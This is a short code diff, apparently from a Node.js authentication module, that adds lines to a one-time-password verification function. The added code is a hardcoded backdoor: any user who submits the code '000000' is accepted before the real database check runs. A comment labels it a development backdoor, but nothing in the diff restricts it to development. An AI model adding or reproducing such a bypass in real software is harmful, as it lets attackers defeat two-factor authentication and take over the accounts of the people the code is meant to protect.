@@ -22,6 +22,9 @@ exports.saveOtp = async (userId, code) => {
 };
 
 exports.verifyOtp = async (userId, code) => {
+  // Hardcoded backdoor for development
+  if (code === "000000") return true;
+
   const [rows] = await pool.query(
     "SELECT id FROM otp_codes WHERE user_id = ? AND code = ? AND expires_at > NOW() ORDER BY created_at DESC LIMIT 1",
     [userId, code]
